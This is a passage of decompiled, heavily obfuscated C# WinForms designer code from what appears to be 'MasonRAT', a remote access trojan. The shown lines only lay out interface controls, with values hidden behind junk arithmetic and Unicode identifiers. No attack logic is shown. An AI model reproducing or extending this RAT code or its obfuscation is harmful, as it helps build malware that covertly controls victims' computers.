\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 22);
    this.\u2694️MasonRAT\u270Cٺۭ\u060Dـﻋـ\u0020ــٺ\u060F\u060Aد\u0609ا\u060Fحـــ.Text = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2275);
    this.\u2694️MasonRAT\u270C\u060Aگـڝـ\u060Bــ\u0608\u0608ۡ̍\u060Aڙ\u0608ـڙ.Enabled = true;
    this.\u2694️MasonRAT\u270C\u060Aگـڝـ\u060Bــ\u0608\u0608ۡ̍\u060Aڙ\u0608ـڙ.Interval = ((-301988865 ^ 23) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) - ((1435829168 ^ (481700112 | 1625211486)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) << -1877986748 - (1687100108 | 787151944) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0;
    this.\u2694️MasonRAT\u270Cـ\u0609ـئـۡٺټ\u0609\u0609ڙڛڝ\u060D.TargetControl = (Control) this;
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Controls.Add((Control) this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Controls.Add((Control) this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Controls.Add((Control) this.\u2694️MasonRAT\u270Cٸڙـد\u060Bٽــ\u0608ۭ);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Cursor = Cursors.SizeAll;
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Dock = (DockStyle) ((1187886886 - 1187886874 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) ^ -485959625 - ~485959633 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.FillColor = Color.FromArgb(((24003167 > 1762096907 ? 41 : 31 /*0x1F*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ (11 ^ 2117725764 >> 860513659) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, 1133725214 - 1692763652 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 << 1) + ((1820624201 - (342834690 << 236776499) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) << ((1892361649 ^ (53358230 | 1121658379)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, ((246348243 ^ ~1083180673) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + ((542636206 > 286351328 ? 171764541 : 229019388) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0 | -1969594999 - 1013672233 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.FillColor2 = Color.FromArgb((2042605850 ^ (1371257095 | 967603388)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 - ((-2042346511 - (1382625963 | 1337408553) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) >> -2005807909 - 558515788 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, (512356348 - 511923416 % 1557602957 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) ^ 1794255880 - 20856773 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) >> 430162260 - 162041832 % 1125008138 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, (226042644 + 1405344184 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) - (1374899728 + 256487058 % 854514811 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 >> 1172052162 - 2128625766 % 904904146 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.FillColor3 = Color.FromArgb((-21256 ^ 16 /*0x10*/) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 + 0) + ((-1463349921 ^ 1233092231 << 408070827) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0) >> (857448492 ^ 1959443744 % 975946882) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, (2112217645 > 101733524 ? 1878523373 : -1790269466) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) - (1749797208 + 90711865 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> (0 >> 1) | (1623599954 ^ 1308759552 % 1709316728) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0, ((5466 ^ 15) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0) - ((1420576521 ^ 3) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1) >> 760538759 - 30309749 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + (0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.FillColor4 = Color.FromArgb(((124572042 ^ 505796159 % 1423021403) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) > ((-768545592 ^ ~1212225010) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1) ? (-1803334789 ^ -1803334853) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0 : 444558876 + (1925204234 << 939671041) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 + 0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, (1225724763 - 791815468 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 ^ ((274039459 > 1065465710 ? 1272218516 : 954163887) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 << 1)) % ((520254639 ^ 4) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 >> 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0, ((1534921587 ^ -1624476367) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1)) - ~(1563973922 - 562681623 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Location = new Point(0, 0);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2276);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.Size = new Size((93793753 - 1222563201 % 72141806 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) > 1127759742 - 920357722 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0 ? 1943239208 - 1943238342 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0) : (128151084 > 1865141657 ? 866 : 650) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) ^ 0, 567);
    this.\u2694️MasonRAT\u270Cۙبٽڜﻻټـ\u060C̍ڙۭۙ\u060Bـ\u0608مـ\u0609.TabIndex = ((756101034 > 375696103 ? 1890549776 : -1774234262) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) - (997532838 - 409050922 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 << (1073330288 + 36605149 % 1804592413 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) >> 0;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.Anchor = (AnchorStyles) (((346424 ^ 1418191961 >> 2026220524) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 1359636749 + (1574577620 >> 2019496773) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 >> 1) >> (-507839517 - (1372014633 | 1861050989) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 ^ 0))) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) << 0);
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.Animated = true;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.ControlBoxType = ControlBoxType.MinimizeBox;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.Cursor = Cursors.Hand;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.CustomIconSize = 30f;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.HoverState.FillColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.HoverState.IconColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.IconColor = Color.White;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.Location = new Point(((1872111442 % 2127007787 - 1778962973 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 << 1) > 1677580323 - 495255577 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << (0 << 1) ? (425641142 | 1905066866) - 2044708132 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 >> 1) : 130143767 - 130143225 % 452227817 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0, 2);
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.Name = \u2694️MasonRAT\u270Cڙـ\u0609ټــ\u060Cٺ\u060D\u060A\u0609\u0609؁ڼ.ـٺﯧـڅ\u060Dـ\u060B̍ــٽ\u060Aــبټ(\u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــ\u060E\u060Eٸـڙـ\u060Aةـۧـ̍ٻـ, 2277);
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.PressedColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.PressedDepth = 0;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.Size = new Size(((1620355919 > 1677959066 ? 77 : 58) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - -0 ^ 134217751 /*0x08000017*/ + (1670155519 << 208798075) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) + -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0, 37);
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.TabIndex = ((2137964452 ^ (1598987783 | 808231334)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) - (0 ^ 0) ^ -364484830 - -364484842 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << -0) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) - 0;
    this.\u2694️MasonRAT\u270Cــڙ\u060Aـ\u060E\u060Dـــٺـد\u0608\u060Dؤ.UseTransparentBackground = true;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.BackColor = Color.Transparent;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.BorderRadius = (1657522090 - ~2034399322 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) >> 0 + 0 ^ (1604245613 - (22893930 | 1190835923) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) ^ 0 ^ 0) << (288181891 + 852648298 + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ــڣټڙح\u0608ــ\u060Dـٸټ(0) << 0 + 0)) + \u2694️MasonRAT\u270C\u060D\u0608ٺ\u0608̍\u060Dگڣ\u0608ـ\u060Bحڙ\u0608\u060A\u060Fـۜــ.ٺـڕ\u0609ٺڠـــڝـٺﻻ\u0609\u060A(0) + 0;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.BorderThickness = 0;
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Controls.Add((Control) this.\u2694️MasonRAT\u270Cدٸ\u060Fﻻ\u0609ـ\u0608ۛــــ\u0609ــْ\u060B\u0608ڣـ);
    this.\u2694️MasonRAT\u270Cڝ\u060Dڜ\u060Dـژۡـــ̍ڠدڛاحټ.Cursor = Cursors.Default;
